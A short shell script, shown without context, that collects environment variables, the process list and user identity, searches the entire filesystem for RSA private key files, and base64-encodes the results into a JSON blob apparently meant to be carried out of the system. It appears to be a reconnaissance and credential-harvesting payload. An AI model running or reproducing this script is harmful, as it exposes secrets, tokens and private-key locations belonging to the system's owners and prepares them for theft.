OUT=my.output
echo "=================================="  >$OUT 2>&1
env >>$OUT 2>&1
echo "=================================="  >>$OUT 2>&1
ps -ef  >>$OUT 2>&1
echo "=================================="  >>$OUT 2>&1
id  >>$OUT 2>&1
echo "=================================="  >>$OUT 2>&1
grep -Rl "-----BEGIN RSA PRIVATE KEY" /  >>$OUT 2>&1

b64=$(cat $OUT|base64 -w0)
echo "{ \"out\": \"${b64}\" }"
